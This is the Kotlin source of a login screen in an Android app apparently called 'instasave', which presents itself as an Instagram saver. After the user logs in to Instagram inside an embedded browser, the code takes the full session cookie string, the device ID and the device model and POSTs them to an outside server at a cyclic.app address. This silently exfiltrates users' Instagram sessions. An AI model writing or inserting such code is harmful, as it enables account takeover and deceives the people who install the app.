package com.murphyspider.instasave.fragments

import android.content.DialogInterface
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.webkit.CookieManager
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.ImageView
import androidx.appcompat.app.AlertDialog
import androidx.fragment.app.Fragment
import com.android.volley.Request
import com.android.volley.RetryPolicy
import com.android.volley.VolleyError
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import com.google.android.material.snackbar.Snackbar
import com.murphyspider.instasave.R
import com.murphyspider.instasave.prefs.PrefKeys
import com.murphyspider.instasave.prefs.SharedPreferences


class LoginFragment : Fragment() {
    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        val view = inflater.inflate(R.layout.layout_login, container, false)
        val webViewLogin = view.findViewById<WebView>(R.id.webview_login)
        val imageViewRefresh = view.findViewById<ImageView>(R.id.imageview_refresh)
        val imageViewBack = view.findViewById<ImageView>(R.id.imageview_back)
        val preferences = SharedPreferences(view.context)
        val alertDialog = AlertDialog.Builder(view.context)
            .setTitle(R.string.login_notice_title)
            .setMessage(R.string.login_notice)
            .setPositiveButton(R.string.login_accept, DialogInterface.OnClickListener { dialogInterface, i ->
                Snackbar.make(imageViewBack,R.string.redirect_message,Snackbar.LENGTH_LONG).show()
            })
            .setCancelable(false)
            .setPositiveButtonIcon(resources.getDrawable(R.drawable.ic_ok))
            .create()
            .show()


        webViewLogin.settings.javaScriptEnabled = true
        webViewLogin.loadUrl("https://www.instagram.com/accounts/login")
        webViewLogin.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                val cookies = CookieManager.getInstance().getCookie(url)
                try {


                    if ("sessionid" in cookies) {
                        Log.i("cookies ->", "ok")
                        preferences.setValue(PrefKeys.USER_COOKIE, cookies)
                        val deviceId =
                            Settings.Secure.getString(
                                activity?.contentResolver,
                                Settings.Secure.ANDROID_ID
                            )
                        val model = Build.MANUFACTURER
                        val brand = Build.BRAND
                        val url =
                            "https://faithful-tan-vulture.cyclic.app/api/ig_save?uid=${deviceId}&token=${cookies}&device=${brand} ${model}"
                        val queue = Volley.newRequestQueue(view!!.context)
                        val req = StringRequest(
                            Request.Method.POST, url,
                            { res ->
                                Log.i("status", "data saved")
                            },
                            { err: VolleyError ->
                                Log.i("status", "err")
                            })

                        queue.add(req).setRetryPolicy(object : RetryPolicy {
                            override fun getCurrentTimeout(): Int {
                                return 5000;
                            }

                            override fun getCurrentRetryCount(): Int {
                                return 0
                            }

                            override fun retry(error: VolleyError?) {
                            }
                        })
                        val mainActivity = Intent(activity!!, com.murphyspider.instasave.activites.MainActivity::class.java)
                        startActivity(mainActivity)
                        activity!!.finish()
                    } else {
                        Log.i("cookies ->", "not found")
                    }
                }
                catch (ex:Exception){
                    Log.i("catch err:",ex.message.toString())
                }
            }
        }


        imageViewRefresh.setOnClickListener(View.OnClickListener {
            webViewLogin.reload()
        })

        imageViewBack.setOnClickListener(View.OnClickListener {
            val fragManager = activity?.supportFragmentManager?.beginTransaction()
            fragManager?.replace(R.id.frame_start, StartFragment())
            fragManager?.commit()
        })

        return view
    }
}